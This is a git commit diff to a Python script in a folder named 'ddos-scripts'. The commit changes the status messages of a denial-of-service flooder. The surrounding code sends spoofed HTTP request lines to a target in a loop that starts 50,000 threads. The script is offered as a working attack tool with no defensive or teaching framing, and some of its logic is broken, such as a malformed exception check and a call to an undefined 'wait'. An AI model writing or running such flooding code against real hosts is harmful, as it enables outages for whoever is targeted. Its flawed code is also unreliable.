999363e230e2a9c2e08cb334bd5aad406bca7125
natemvm-py <natecowley2014@gmail.com>
2021-06-03 19:11:53 +1200

    Update socket-simple.py

--- python/ddos-scripts/socket-simple.py
+++ python/ddos-scripts/socket-simple.py
@@ -19,14 +19,18 @@ def attack():
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
         global attack_num
         attack_num += 1
-        print("DDOSING HARDER THAN A PLUS T RB")
+        print("attack block re-executed:", attack_num )
         s.close()
         
 for i in range(50000):
     thread = threading.Thread(target=attack)
     thread.start()
     if(thread.is_alive):
-        print("STILL GOING BABY!!!!")
+        print("sending packets.")
+        wait(0.3)
+        print("sending packets..")
+        wait(0.3)
+        print("sending packets...")
     elif OSError or Exception in thread:
         thread.start()
     else:
